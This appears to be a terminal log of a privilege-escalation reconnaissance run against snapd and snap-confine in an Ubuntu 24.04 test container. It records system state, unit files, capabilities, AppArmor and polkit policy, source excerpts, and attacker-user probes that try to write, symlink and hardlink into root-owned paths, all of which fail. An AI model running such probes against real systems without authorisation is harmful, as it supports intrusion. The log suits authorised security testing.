snapd/snap-confine current default trust-boundary probe
target=ubuntu24-server-lpe-target
2026-05-17T15:55:00-0400

$ docker exec -i ubuntu24-server-lpe-target bash

## pre-clean

## default package, service, socket, snap state
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
Linux bf51bb670420 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
apparmor	4.0.1really4.0.1-0ubuntu0.24.04.6	arm64
curl	8.5.0-2ubuntu10.9	arm64
dbus	1.14.10-4ubuntu4.1	arm64
jq	1.7.1-3ubuntu0.24.04.2	arm64
policykit-1		
polkitd	124-2ubuntu1.24.04.3	arm64
snapd	2.74.1+ubuntu24.04.4	arm64
squashfs-tools	1:4.6.1-1build1	arm64
strace	6.8-0ubuntu2	arm64
systemd	255.4-1ubuntu8.15	arm64
snapd:
  Installed: 2.74.1+ubuntu24.04.4
  Candidate: 2.74.1+ubuntu24.04.4
  Version table:
 *** 2.74.1+ubuntu24.04.4 500
        500 http://ports.ubuntu.com/ubuntu-ports noble-updates/main arm64 Packages
        100 /var/lib/dpkg/status
     2.73+ubuntu24.04.2 500
        500 http://ports.ubuntu.com/ubuntu-ports noble-security/main arm64 Packages
     2.62+24.04build1 500
        500 http://ports.ubuntu.com/ubuntu-ports noble/main arm64 Packages
snap          2.74.1+ubuntu24.04.4
snapd         2.74.1+ubuntu24.04.4
series        16
ubuntu        24.04
kernel        6.10.14-linuxkit
architecture  arm64
No snaps are installed yet. Try 'snap install hello-world'.

## attacker snap list
$ runuser -u attacker -- snap list --all
No snaps are installed yet. Try 'snap install hello-world'.
rc=0
active
active
active
enabled
enabled
enabled
* snapd.service - Snap Daemon
     Loaded: loaded (/usr/lib/systemd/system/snapd.service; enabled; preset: enabled)
     Active: active (running) since Sun 2026-05-17 19:55:00 UTC; 3s ago
TriggeredBy: * snapd.socket
   Main PID: 71770 (snapd)
      Tasks: 11 (limit: 9517)
     Memory: 15.3M (peak: 17.1M)
        CPU: 251ms
     CGroup: /docker/bf51bb670420b556386b1dab94ce9cfc181e36dc1ddf0267171ade06c2318470/system.slice/snapd.service
             `-71770 /usr/lib/snapd/snapd

May 17 19:55:00 bf51bb670420 systemd[1]: Starting snapd.service - Snap Daemon...
May 17 19:55:00 bf51bb670420 snapd[71770]: overlord.go:294: Acquiring state lock file
May 17 19:55:00 bf51bb670420 snapd[71770]: overlord.go:299: Acquired state lock file
May 17 19:55:00 bf51bb670420 snapd[71770]: daemon.go:276: started snapd/2.74.1+ubuntu24.04.4 (series 16; classic; devmode) ubuntu/24.04 (arm64) linux/6.10.14-linuxkit.
May 17 19:55:00 bf51bb670420 snapd[71770]: daemon.go:370: adjusting startup timeout by 30s (pessimistic estimate of 30s plus 5s per snap)
May 17 19:55:00 bf51bb670420 snapd[71770]: backends.go:70: AppArmor status: apparmor not enabled
May 17 19:55:00 bf51bb670420 snapd[71770]: standby.go:95: will consider standby after: 5s
May 17 19:55:00 bf51bb670420 systemd[1]: Started snapd.service - Snap Daemon.
May 17 19:55:00 bf51bb670420 snapd[71770]: snapmgr.go:1659: performing periodic snap downloads cache cleanup
May 17 19:55:00 bf51bb670420 snapd[71770]: snapmgr.go:1669: cannot clean store downloads cache: open /var/lib/snapd/cache: no such file or directory

* snapd.socket - Socket activation for snappy daemon
     Loaded: loaded (/usr/lib/systemd/system/snapd.socket; enabled; preset: enabled)
     Active: active (running) since Sun 2026-05-17 18:21:19 UTC; 1h 33min ago
   Triggers: * snapd.service
     Listen: /run/snapd.socket (Stream)
             /run/snapd-snap.socket (Stream)
      Tasks: 0 (limit: 9517)
     Memory: 0B (peak: 0B)
        CPU: 1ms
     CGroup: /docker/bf51bb670420b556386b1dab94ce9cfc181e36dc1ddf0267171ade06c2318470/system.slice/snapd.socket

May 17 18:21:19 bf51bb670420 systemd[1]: Starting snapd.socket - Socket activation for snappy daemon...
May 17 18:21:19 bf51bb670420 systemd[1]: Listening on snapd.socket - Socket activation for snappy daemon.

* snapd.seeded.service - Wait until snapd is fully seeded
     Loaded: loaded (/usr/lib/systemd/system/snapd.seeded.service; enabled; preset: enabled)
     Active: active (exited) since Sun 2026-05-17 18:21:20 UTC; 1h 33min ago
   Main PID: 257 (code=exited, status=0/SUCCESS)
        CPU: 224ms

May 17 18:21:19 bf51bb670420 systemd[1]: Starting snapd.seeded.service - Wait until snapd is fully seeded...
May 17 18:21:20 bf51bb670420 systemd[1]: Finished snapd.seeded.service - Wait until snapd is fully seeded.
Id=snapd.autoimport.service
ActiveState=inactive
SubState=dead
ConditionResult=no

Id=snapd.snap-repair.timer
ActiveState=inactive
SubState=dead
ConditionResult=no

[snapd packaged units]
# /usr/lib/systemd/system/snapd.socket
[Unit]
Description=Socket activation for snappy daemon

[Socket]
ListenStream=/run/snapd.socket
ListenStream=/run/snapd-snap.socket
SocketMode=0666
# these are the defaults, but can't hurt to specify them anyway:
SocketUser=root
SocketGroup=root

[Install]
WantedBy=sockets.target

# /usr/lib/systemd/system/snapd.service
[Unit]
Description=Snap Daemon
After=snapd.socket
After=time-set.target
After=snapd.mounts.target
Wants=time-set.target
Wants=snapd.mounts.target
Requires=snapd.socket
OnFailure=snapd.failure.service
# This is handled by snapd
# X-Snapd-Snap: do-not-start

[Service]
# Disabled because it breaks lxd
# (https://bugs.launchpad.net/snapd/+bug/1709536)
#Nice=-5
OOMScoreAdjust=-900
ExecStart=/usr/lib/snapd/snapd
EnvironmentFile=-/etc/environment
EnvironmentFile=-/var/lib/snapd/environment/snapd.conf
Restart=always
# with systemd v254+, skip going through failed state during restart
RestartMode=direct
WatchdogSec=5m
Type=notify
NotifyAccess=all
SuccessExitStatus=42
RestartPreventExitStatus=42
KillMode=process
KeyringMode=shared

[Install]
WantedBy=multi-user.target

# /usr/lib/systemd/system/snapd.autoimport.service
[Unit]
Description=Auto import assertions from block devices
After=snapd.service snapd.socket snapd.seeded.service
# don't run on classic
ConditionKernelCommandLine=|snap_core
# TODO:UC20: only enable this in run mode?
ConditionKernelCommandLine=|snapd_recovery_mode

[Service]
Type=oneshot
ExecStart=/usr/bin/snap auto-import
EnvironmentFile=-/var/lib/snapd/environment/snapd.conf

[Install]
WantedBy=multi-user.target
# This cannot be started on firstboot
# X-Snapd-Snap: do-not-start

# /usr/lib/systemd/system/snapd.snap-repair.timer
[Unit]
Description=Timer to automatically fetch and run repair assertions
# don't run on classic
ConditionKernelCommandLine=|snap_core
ConditionKernelCommandLine=|snapd_recovery_mode

[Timer]
OnCalendar=*-*-* 5,11,17,23:00
RandomizedDelaySec=2h
AccuracySec=10min
Persistent=true
OnStartupSec=15m

[Install]
WantedBy=timers.target

[relevant modes and capabilities]
srw-rw-rw- 666 root:root 0:0 /run/snapd.socket
srw-rw-rw- 666 root:root 0:0 /run/snapd-snap.socket
-rwxr-xr-x 755 root:root 0:0 /usr/lib/snapd/snap-confine
-rwxr-xr-x 755 root:root 0:0 /usr/lib/snapd/snap-update-ns
-rwxr-xr-x 755 root:root 0:0 /usr/lib/snapd/snap-discard-ns
drwxr-xr-x 755 root:root 0:0 /snap
drwxr-xr-x 755 root:root 0:0 /var/lib/snapd
drwxr-xr-x 755 root:root 0:0 /var/lib/snapd/snaps
drwxr-xr-x 755 root:root 0:0 /run/snapd
drwxr-xr-x 755 root:root 0:0 /run/snapd/ns
drwxr-xr-x 755 root:root 0:0 /run/snapd/lock
drwxr-xr-x 755 root:root 0:0 /var/snap
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/snapd/snap-update-ns
/usr/lib/snapd/snap-discard-ns

[apparmor status]
apparmor not present.

[polkit snapd policy]
     1	<?xml version="1.0" encoding="UTF-8"?>
     2	<!DOCTYPE policyconfig PUBLIC
     3	 "-//freedesktop//DTD PolicyKit Policy Configuration 1.0//EN"
     4	 "http://www.freedesktop.org/standards/PolicyKit/1.0/policyconfig.dtd">
     5	<policyconfig>
     6	
     7	  <vendor>Snapcraft</vendor>
     8	  <vendor_url>http://snapcraft.io</vendor_url>
     9	
    10	  <action id="io.snapcraft.snapd.login">
    11	    <description gettext-domain="snappy">Authenticate on snap daemon</description>
    12	    <message gettext-domain="snappy">Authorization is required to authenticate on the snap daemon</message>
    13	    <defaults>
    14	      <allow_any>auth_admin</allow_any>
    15	      <allow_inactive>auth_admin</allow_inactive>
    16	      <allow_active>auth_admin_keep</allow_active>
    17	    </defaults>
    18	  </action>
    19	
    20	  <action id="io.snapcraft.snapd.manage">
    21	    <description gettext-domain="snappy">Install, update, or remove packages</description>
    22	    <message gettext-domain="snappy">Authentication is required to install, update, or remove packages</message>
    23	    <defaults>
    24	      <allow_any>auth_admin</allow_any>
    25	      <allow_inactive>auth_admin</allow_inactive>
    26	      <allow_active>auth_admin_keep</allow_active>
    27	    </defaults>
    28	  </action>
    29	
    30	  <action id="io.snapcraft.snapd.manage-interfaces">
    31	    <description gettext-domain="snappy">Connect, disconnect interfaces</description>
    32	    <message gettext-domain="snappy">Authentication is required to connect or disconnect interfaces</message>
    33	    <defaults>
    34	      <allow_any>auth_admin</allow_any>
    35	      <allow_inactive>auth_admin</allow_inactive>
    36	      <allow_active>auth_admin_keep</allow_active>
    37	    </defaults>
    38	  </action>
    39	
    40	  <action id="io.snapcraft.snapd.manage-configuration">
    41	    <description gettext-domain="snappy">Access or modify snap configuration</description>
    42	    <message gettext-domain="snappy">Authentication is required to access or modify snap configuration</message>
    43	    <defaults>
    44	      <allow_any>auth_admin</allow_any>
    45	      <allow_inactive>auth_admin</allow_inactive>
    46	      <allow_active>auth_admin_keep</allow_active>
    47	    </defaults>
    48	  </action>
    49	
    50	  <action id="io.snapcraft.snapd.manage-fde">
    51	    <description gettext-domain="snappy">Manage disk encryption</description>
    52	    <message gettext-domain="snappy">Authentication is required to manage disk encryption setup</message>
    53	    <defaults>
    54	      <allow_any>auth_admin</allow_any>
    55	      <allow_inactive>auth_admin</allow_inactive>
    56	      <allow_active>auth_admin_keep</allow_active>
    57	    </defaults>
    58	  </action>
    59	
    60	</policyconfig>

[snap-confine packaged AppArmor profile highlights]
     1	# Author: Jamie Strandboge <jamie@canonical.com>
     2	#include <tunables/global>
     3	
     4	@{SNAP_MOUNT_DIR_LIST}="{,/var/lib/snapd}/snap"
     5	
     6	/usr/lib/snapd/snap-confine (attach_disconnected) {
     7	    # Include any additional files that snapd chose to generate.
     8	    # - for $HOME on remote file system.
     9	    # - for $HOME on encrypted media
    10	    #
    11	    # Those are discussed on https://forum.snapcraft.io/t/snapd-vs-upstream-kernel-vs-apparmor
    12	    # and https://forum.snapcraft.io/t/snaps-and-nfs-home/
    13	    #include "/var/lib/snapd/apparmor/snap-confine"
    14	
    15	    # We run privileged, so be fanatical about what we include and don't use
    16	    # any abstractions
    17	    /etc/ld.so.cache r,
    18	    /etc/ld.so.preload r,
    19	
    20	    # Do not assume that the interpreter is always named like
    72	    # SNAP_MOUNT_DIR probe logic
    73	    /proc/1/root/snap r,
    74	
    75	    # cgroup: devices
    76	    capability sys_admin,
    77	    capability dac_read_search,
    78	    capability dac_override,
    79	    /sys/fs/cgroup/ r,
    80	    /sys/fs/cgroup/devices/ r,
   133	    # Don't allow changing profile to unconfined or profiles that start with
   134	    # '/'. Use 'unsafe' to support snap-exec on armhf and its reliance on
   135	    # the environment for determining the capabilities of the architecture.
   136	    # 'unsafe' is ok here because the kernel will have already cleared the
   137	    # environment as part of launching snap-confine with CAP_SYS_ADMIN. This
   138	    # does leave directories as configured by ld.so.preload as well as
   139	    # LD_PRELOAD to be set to a library which is in a directory configured by
   140	    # ld.so.conf, but access to those locations is mediated by this profile
   141	    # (which requires rules for specific locations).
   142	    # TODO: use GenerateAAREExclusionPatterns for this, though the first
   143	    # rule and the fact that the generative aspect is not an absolute filepath
   144	    # complicate using that function directly
   145	    change_profile unsafe /** -> [^u/]**,
   146	    change_profile unsafe /** -> u[^n]**,
   147	    change_profile unsafe /** -> un[^c]**,
   148	    change_profile unsafe /** -> unc[^o]**,
   149	    change_profile unsafe /** -> unco[^n]**,
   150	    change_profile unsafe /** -> uncon[^f]**,
   151	    change_profile unsafe /** -> unconf[^i]**,
   152	    change_profile unsafe /** -> unconfi[^n]**,
   153	    change_profile unsafe /** -> unconfin[^e]**,
   154	    change_profile unsafe /** -> unconfine[^d]**,
   155	    change_profile unsafe /** -> unconfined?**,
   156	
   157	    # allow changing to a few not caught above
   158	    change_profile unsafe /** -> {u,un,unc,unco,uncon,unconf,unconfi,unconfin,unconfine},
   173	    # For mounting base dir by dir (write dirs and mount on them)
   174	    /tmp/snap.rootfs_** rw,
   175	    mount options=(remount ro) -> /tmp/snap.rootfs_*/,
   176	    mount options=(rw rbind) @{SNAP_MOUNT_DIR_LIST}/*/*/**/ -> /tmp/snap.rootfs_**/,
   177	    # For mounting individual files
   178	    mount options=(rw bind) @{SNAP_MOUNT_DIR_LIST}/*/*/** -> /tmp/snap.rootfs_*/**,
   179	    mount options=(rw rslave) -> /tmp/snap.rootfs_**/,
   180	    # Allow mounting dirs from /
   181	    mount options=(rw rbind) /*/ -> /tmp/snap.rootfs_**/,
   182	
   183	    # LP: #1668659 and parallel instances of classic snaps
   184	    mount options=(rw rbind) /snap/ -> /snap/,
   185	    mount options=(rw rshared) -> /snap/,
   186	    mount options=(rw rbind) /var/lib/snapd/snap/ -> /var/lib/snapd/snap/,
   187	    mount options=(rw rshared) -> /var/lib/snapd/snap/,
   188	
   189	    # boostrapping the mount namespace
   190	    /tmp/snap.rootfs_*/ rw,
   191	    mount fstype=tmpfs none -> /tmp/snap.rootfs_*/,
   192	    mount options=(rw rshared) -> /,
   193	    mount options=(rw bind) /tmp/snap.rootfs_*/ -> /tmp/snap.rootfs_*/,
   194	    mount options=(rw unbindable) -> /tmp/snap.rootfs_*/,
   195	    # the next line is for classic system
   196	    mount options=(rw rbind) @{SNAP_MOUNT_DIR_LIST}/*/*/ -> /tmp/snap.rootfs_*/,
   197	    # the next line is for core system
   198	    mount options=(rw rbind) / -> /tmp/snap.rootfs_*/,
   480	    # support for locking
   481	    /run/snapd/lock/ rw,
   482	    /run/snapd/lock/*.lock rwk,
   483	
   484	    # support for the mount namespace sharing
   485	    capability fowner,
   486	    capability sys_ptrace,
   487	    # allow snap-confine to read /proc/1/ns/mnt
   488	    ptrace read peer=unconfined,
   489	    # https://forum.snapcraft.io/t/custom-kernel-error-on-readlinkat-in-mount-namespace/6097/21
   490	    ptrace trace peer=unconfined,
   491	
   492	    mount options=(rw rbind) /run/snapd/ns/ -> /run/snapd/ns/,
   493	    mount options=(private) -> /run/snapd/ns/,
   494	    / rw,
   495	    /run/ rw,
   496	    /run/snapd/ rw,
   497	    /run/snapd/ns/ rw,
   498	    /run/snapd/ns/*.lock rwk,
   499	    /run/snapd/ns/*.mnt rw,
   500	    ptrace (read, readby, tracedby) peer=/usr/lib/snapd/snap-confine//mount-namespace-capture-helper,
   501	    @{PROC}/*/mountinfo r,
   502	    capability sys_chroot,
   503	    capability sys_admin,
   504	    signal (send, receive) set=(abrt) peer=/usr/lib/snapd/snap-confine,
   505	    signal (send) set=(int) peer=/usr/lib/snapd/snap-confine//mount-namespace-capture-helper,
   506	    signal (send, receive) set=(int, alrm, exists) peer=/usr/lib/snapd/snap-confine,
   507	    signal (receive) set=(exists) peer=/usr/lib/snapd/snap-confine//mount-namespace-capture-helper,
   508	
   509	    # workaround for linux 4.13/upstream, see
   510	    # https://forum.snapcraft.io/t/snapd-2-27-6-2-in-debian-sid-blocked-on-apparmor-in-kernel-4-13-0-1/2813/3
   511	    ptrace (trace, tracedby) peer=/usr/lib/snapd/snap-confine,
   512	
   513	    # Allow reading snap cookies.
   514	    /var/lib/snapd/cookie/snap.* r,
   515	
   516	    # For aa_change_hat() to go into ^mount-namespace-capture-helper
   517	    @{PROC}/[0-9]*/attr/{,apparmor/}current w,
   518	
   519	    # As a special exception allow snap-confine to write to anything in /var/lib.
   520	    # This code should be changed to allow delegation so that snap-confine can
   521	    # inherit any file descriptor and pass it to the invoked application but
   522	    # this is not possible in apparmor yet.
   523	    # See https://bugs.launchpad.net/snapd/+bug/1815869
   524	    /var/lib/** rw,
   600	    # Allow switching to snap-update-ns with a per-snap profile.
   601	    change_profile -> snap-update-ns.*,
   602	
   603	    # Allow executing snap-update-ns when...
   604	
   605	    # ...snap-confine is, conceptually, re-executing and uses snap-update-ns
   606	    # from the distribution package. This is also the location used when using
   607	    # the core/base snap on all-snap systems. The variants here represent
   608	    # various locations of libexecdir across distributions.
   609	    /usr/lib{,exec,64}/snapd/snap-update-ns r,
   610	
   611	    # ...snap-confine is not, conceptually, re-executing and uses
   612	    # snap-update-ns from the distribution package but we are already inside
   613	    # the constructed mount namespace so we must traverse "hostfs". The
   614	    # variants here represent various locations of libexecdir across
   615	    # distributions.
   616	    /var/lib/snapd/hostfs/usr/lib{,exec,64}/snapd/snap-update-ns r,
   617	
   618	    # ..snap-confine is, conceptually, re-executing and uses snap-update-ns
   619	    # from the core or snapd snaps. Note that the location of the actual snap
   620	    # varies from distribution to distribution. The variants here represent
   621	    # different locations of snap mount directory across distributions.
   622	    /{,var/lib/snapd/}snap/{core,snapd}/*/usr/lib/snapd/snap-update-ns r,
   623	
   624	    # ...snap-confine is, conceptually, re-executing and uses snap-update-ns
   625	    # from the core snap or snapd snap, but we are already inside the
   626	    # constructed mount namespace. Here the apparmor kernel module
   627	    # re-constructs the path to snap-update-ns using the "hostfs" mount entry
   628	    # rather than the more "natural" /snap mount entry but we have no control
   629	    # over that.  This is reported as (LP: #1716339). The variants here
   630	    # represent different locations of snap mount directory across
   631	    # distributions.
   632	    /var/lib/snapd/hostfs/{,var/lib/snapd/}snap/{core,snapd}/*/usr/lib/snapd/snap-update-ns r,
   633	
   634	    # Allow executing snap-discard-ns, just like the set for snap-update-ns
   635	    # above but with the key difference that snap-discard-ns does not
   636	    # have a dedicated profile so we need to inherit snap-confine's profile.
   637	
   638	    /usr/lib{,exec,64}/snapd/snap-discard-ns rix,
   639	    /var/lib/snapd/hostfs/usr/lib{,exec,64}/snapd/snap-discard-ns rix,
   640	    /{,var/lib/snapd/}snap/{core,snapd}/*/usr/lib/snapd/snap-discard-ns rix,
   641	    /var/lib/snapd/hostfs/{,var/lib/snapd/}snap/{core,snapd}/*/usr/lib/snapd/snap-discard-ns rix,

## default snapd directories and attacker writable paths
-r--r--r-- root:root /snap/README -> 
-rw------- root:root /run/snapd/lock/.lock -> 
-rw------- root:root /run/snapd/lock/hello.lock -> 
-rw------- root:root /run/snapd/lock/test.lock -> 
-rw------- root:root /var/lib/snapd/state.json -> 
-rw-r--r-- root:root /usr/lib/snapd/complete.sh -> 
-rw-r--r-- root:root /usr/lib/snapd/etelpmoc.sh -> 
-rw-r--r-- root:root /usr/lib/snapd/info -> 
-rw-r--r-- root:root /usr/lib/snapd/snap-confine.caps -> 
-rw-r--r-- root:root /usr/lib/snapd/snap-confine.v2-only.caps -> 
-rw-r--r-- root:root /var/lib/snapd/features/classic-preserves-xdg-runtime-dir -> 
-rw-r--r-- root:root /var/lib/snapd/features/refresh-app-awareness -> 
-rw-r--r-- root:root /var/lib/snapd/state.lock -> 
-rw-r--r-- root:root /var/lib/snapd/system-key -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-bootstrap -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-confine -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-device-helper -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-discard-ns -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-exec -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-failure -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-fde-keymgr -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-gdbserver-shim -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-gpio-helper -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-mgmt -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-preseed -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-recovery-chooser -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-repair -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-seccomp -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-strace-shim -> 
-rwxr-xr-x root:root /usr/lib/snapd/snap-update-ns -> 
-rwxr-xr-x root:root /usr/lib/snapd/snapctl -> 
-rwxr-xr-x root:root /usr/lib/snapd/snapd -> 
-rwxr-xr-x root:root /usr/lib/snapd/snapd-apparmor -> 
-rwxr-xr-x root:root /usr/lib/snapd/snapd.core-fixup.sh -> 
-rwxr-xr-x root:root /usr/lib/snapd/snapd.run-from-snap -> 
-rwxr-xr-x root:root /usr/lib/snapd/system-shutdown -> 
d--x--x--x root:root /var/lib/snapd/void -> 
drwx------ root:root /var/lib/snapd/cookie -> 
drwxr-xr-x root:root /run/snapd -> 
drwxr-xr-x root:root /run/snapd/lock -> 
drwxr-xr-x root:root /run/snapd/ns -> 
drwxr-xr-x root:root /snap -> 
drwxr-xr-x root:root /usr/lib/snapd -> 
drwxr-xr-x root:root /var/lib/snapd -> 
drwxr-xr-x root:root /var/lib/snapd/apparmor -> 
drwxr-xr-x root:root /var/lib/snapd/apparmor/snap-confine -> 
drwxr-xr-x root:root /var/lib/snapd/assertions -> 
drwxr-xr-x root:root /var/lib/snapd/assertions/asserts-v0 -> 
drwxr-xr-x root:root /var/lib/snapd/assertions/asserts-v0/model -> 
drwxr-xr-x root:root /var/lib/snapd/assertions/private-keys-v1 -> 
drwxr-xr-x root:root /var/lib/snapd/auto-import -> 
drwxr-xr-x root:root /var/lib/snapd/dbus-1 -> 
drwxr-xr-x root:root /var/lib/snapd/dbus-1/services -> 
drwxr-xr-x root:root /var/lib/snapd/dbus-1/system-services -> 
drwxr-xr-x root:root /var/lib/snapd/desktop -> 
drwxr-xr-x root:root /var/lib/snapd/desktop/applications -> 
drwxr-xr-x root:root /var/lib/snapd/environment -> 
drwxr-xr-x root:root /var/lib/snapd/features -> 
drwxr-xr-x root:root /var/lib/snapd/firstboot -> 
drwxr-xr-x root:root /var/lib/snapd/hostfs -> 
drwxr-xr-x root:root /var/lib/snapd/inhibit -> 
drwxr-xr-x root:root /var/lib/snapd/lib -> 
drwxr-xr-x root:root /var/lib/snapd/lib/gl -> 
drwxr-xr-x root:root /var/lib/snapd/lib/gl32 -> 
drwxr-xr-x root:root /var/lib/snapd/lib/glvnd -> 
drwxr-xr-x root:root /var/lib/snapd/lib/vulkan -> 
drwxr-xr-x root:root /var/lib/snapd/snaps -> 
drwxr-xr-x root:root /var/lib/snapd/snaps/partial -> 
drwxr-xr-x root:root /var/lib/snapd/ssl -> 
drwxr-xr-x root:root /var/lib/snapd/ssl/store-certs -> 
drwxr-xr-x root:root /var/snap -> 

## attacker writable search under snapd state
$ runuser -u attacker -- bash -lc find\ /run/snapd\ /var/lib/snapd\ /var/snap\ /snap\ /usr/lib/snapd\ -xdev\ \\\(\ -writable\ -o\ -perm\ -0002\ -o\ -perm\ -0020\ \\\)\ -printf\ \"%M\ %u:%g\ %p\ -\>\ %l\\n\"\ 2\>/dev/null\ \|\ sort\ \|\ sed\ -n\ \"1\,160p\"
rc=0

## attacker direct write/symlink/hardlink probes in root-owned snapd paths
$ runuser -u attacker -- bash -lc $'\nfor d in /run/snapd /run/snapd/lock /run/snapd/ns /var/lib/snapd /var/lib/snapd/snaps /var/lib/snapd/mount /var/lib/snapd/seccomp /snap /var/snap; do\n  printf "touch %-35s -> " "$d/scd_touch"\n  touch "$d/scd_touch" 2>&1\n  echo "rc=$?"\n  rm -f "$d/scd_touch" 2>/dev/null || true\ndone\nln -s /root/scd-symlink-target /run/snapd/lock/scd-symlink.lock 2>&1\nprintf "symlink_rc=%s\\n" "$?"\nln /usr/lib/snapd/snap-confine /tmp/scd-hardlink 2>&1\nprintf "hardlink_rc=%s\\n" "$?"\nls -ln /tmp/scd-hardlink 2>&1 || true\n'
touch /run/snapd/scd_touch                -> touch: cannot touch '/run/snapd/scd_touch': Permission denied
rc=1
touch /run/snapd/lock/scd_touch           -> touch: cannot touch '/run/snapd/lock/scd_touch': Permission denied
rc=1
touch /run/snapd/ns/scd_touch             -> touch: cannot touch '/run/snapd/ns/scd_touch': Permission denied
rc=1
touch /var/lib/snapd/scd_touch            -> touch: cannot touch '/var/lib/snapd/scd_touch': Permission denied
rc=1
touch /var/lib/snapd/snaps/scd_touch      -> touch: cannot touch '/var/lib/snapd/snaps/scd_touch': Permission denied
rc=1
touch /var/lib/snapd/mount/scd_touch      -> touch: cannot touch '/var/lib/snapd/mount/scd_touch': No such file or directory
rc=1
touch /var/lib/snapd/seccomp/scd_touch    -> touch: cannot touch '/var/lib/snapd/seccomp/scd_touch': No such file or directory
rc=1
touch /snap/scd_touch                     -> touch: cannot touch '/snap/scd_touch': Permission denied
rc=1
touch /var/snap/scd_touch                 -> touch: cannot touch '/var/snap/scd_touch': Permission denied
rc=1
ln: failed to create symbolic link '/run/snapd/lock/scd-symlink.lock': Permission denied
symlink_rc=1
ln: failed to create hard link '/tmp/scd-hardlink' => '/usr/lib/snapd/snap-confine': Operation not permitted
hardlink_rc=1
ls: cannot access '/tmp/scd-hardlink': No such file or directory
rc=0

## current source acquisition and trust-boundary code review
SRCDIR=/tmp/snapd-current-src/snapd-2.74.1+ubuntu24.04.4
2.74.1+ubuntu24.04.4

[access.go: polkit/ucred/socket gate]
    50	func checkPolkitActionImpl(r *http.Request, ucred *ucrednet, action string) *apiError {
    51		var flags polkit.CheckFlags
    52		allowHeader := r.Header.Get(client.AllowInteractionHeader)
    53		if allowHeader != "" {
    54			if allow, err := strconv.ParseBool(allowHeader); err != nil {
    55				logger.Noticef("error parsing %s header: %s", client.AllowInteractionHeader, err)
    56			} else if allow {
    57				flags |= polkit.CheckAllowInteraction
    58			}
    59		}
    60		// Pass both pid and uid from the peer ucred to avoid pid race
    61		switch authorized, err := polkitCheckAuthorization(ucred.Pid, ucred.Uid, action, nil, flags); err {
    62		case nil:
    63			if authorized {
    64				// polkit says user is authorised
    65				return nil
    66			}
    67		case polkit.ErrDismissed:
    68			return AuthCancelled("cancelled")
    69		default:
    70			logger.Noticef("polkit error: %s", err)
    71		}
    72		return Unauthorized("access denied")
   133	func checkAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState, opts accessOptions) *apiError {
   134		if err := opts.validate(); err != nil {
   135			return InternalError(err.Error())
   136		}
   137	
   138		if rspe := requireSockets(ucred, opts.Sockets); rspe != nil {
   139			return rspe
   140		}
   141	
   142		if opts.InterfaceAccess != nil {
   143			// No interface checks are made if request is coming from snapd.socket
   144			// to account for the snapd-control interface.
   145			rspe := requireInterfaceApiAccess(d, r, ucred, *opts.InterfaceAccess)
   146			if rspe != nil {
   147				return rspe
   148			}
   149		}
   150	
   151		if opts.AccessLevel == accessLevelOpen {
   152			return nil
   153		}
   154	
   155		if opts.AccessLevel == accessLevelAuthenticated && user != nil {
   156			// user != nil means we have an authenticated user
   157			return nil
   158		}
   159	
   160		if ucred.Uid == 0 {
   161			return nil
   162		}
   163	
   164		// We check polkit last because it may result in the user
   165		// being prompted for authorisation. This should be avoided if
   166		// access is otherwise granted.
   167		if opts.PolkitAction != "" {
   168			return checkPolkitAction(r, ucred, opts.PolkitAction)
   169		}
   170	
   171		// XXX: when to 403 vs 401?
   172		if opts.AccessLevel == accessLevelAuthenticated || opts.InterfaceAccess != nil {
   173			return Unauthorized("access denied")
   174		}
   175		return Forbidden("access denied")
   178	// openAccess allows requests without authentication, provided they
   179	// have peer credentials and were not received on snapd-snap.socket
   180	type openAccess struct{}
   181	
   182	func (ac openAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   183		opts := accessOptions{
   184			AccessLevel: accessLevelOpen,
   185			Sockets:     []string{dirs.SnapdSocket},
   186		}
   187		return checkAccess(d, r, ucred, user, opts)
   188	}
   189	
   190	// authenticatedAccess allows requests from authenticated users,
   191	// provided they were not received on snapd-snap.socket
   192	//
   193	// A user is considered authenticated if they provide a macaroon, are
   194	// the root user according to peer credentials, or granted access by
   195	// Polkit.
   196	type authenticatedAccess struct {
   197		// Polkit is an optional polkit action to check as fallback
   198		// if the user is not root or does not provide a macaroon.
   199		//
   200		// Note: The specified polkit action must require auth_admin
   201		// to avoid compromising security.
   202		Polkit string
   203	}
   204	
   205	func (ac authenticatedAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   206		opts := accessOptions{
   207			AccessLevel:  accessLevelAuthenticated,
   208			Sockets:      []string{dirs.SnapdSocket},
   209			PolkitAction: ac.Polkit,
   210		}
   211		return checkAccess(d, r, ucred, user, opts)
   212	}
   213	
   214	// rootAccess allows requests from the root uid, provided they
   215	// were not received on snapd-snap.socket
   216	type rootAccess struct{}
   217	
   218	func (ac rootAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   219		opts := accessOptions{
   220			AccessLevel: accessLevelRoot,
   221			Sockets:     []string{dirs.SnapdSocket},
   222		}
